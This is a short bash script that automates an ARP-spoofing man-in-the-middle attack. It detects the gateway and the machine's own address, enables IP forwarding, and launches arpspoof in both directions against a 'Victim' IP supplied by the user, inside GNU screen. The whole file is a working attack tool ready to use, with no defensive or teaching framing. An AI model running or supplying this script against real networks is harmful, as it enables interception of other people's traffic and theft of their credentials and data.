#!/usr/bin/env bash
# $1	Victim IP Address
# $2	Interface

RCFILE="/tmp/arpspoofex.rc"

# No arguments delivered or first argument -h: Help
if [ -z "$1" ] || [ "$1" == "-h" ]
then
	echo "Usage:"
	echo "$0 <Victim IP Address> <interface>"
	exit 1
else
	# Victim IP Address
	VICTIM=$1
fi

# Interface
if [ -z "$2" ]
then
	echo "No Interface Provided."
	exit 1
else
	INTERFACE="$2"
fi

# Router IP Address
GATEWAY=`ip route show | grep default | awk '{print $3}'`
if [ -z "$GATEWAY" ]
then
 	echo "Router IP Address not found."
	exit 1
fi

# Own IP Address
SELF=`ifconfig | grep inet | grep -v inet6 | grep -v 127.0.0.1 | awk '{print $2}' | cut -d : -f 2`
if [ -z "$SELF" ]
then
	echo "Own IP Address not found."
	exit 1
fi

echo -e "Victim IP Address:\t\t\t$VICTIM"
echo -e "Gathering Default Gateway IP Address:\t$GATEWAY"
echo -e "Gathering Own IP Address:\t\t$SELF"

echo "Starting arpspoof..."
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "startup_message off" > $RCFILE
echo -e "caption always \"%{= kw}%-w%{= BW}%n %t%{-}%+w %-= @%H - %LD %d %LM - %c\"" >> $RCFILE
echo -e "screen -r -t Main" >> $RCFILE
echo -e "screen -t Router arpspoof -t $GATEWAY $VICTIM" >> $RCFILE
echo -e "screen -t Victim arpspoof -t $VICTIM $GATEWAY" >> $RCFILE

screen -c $RCFILE
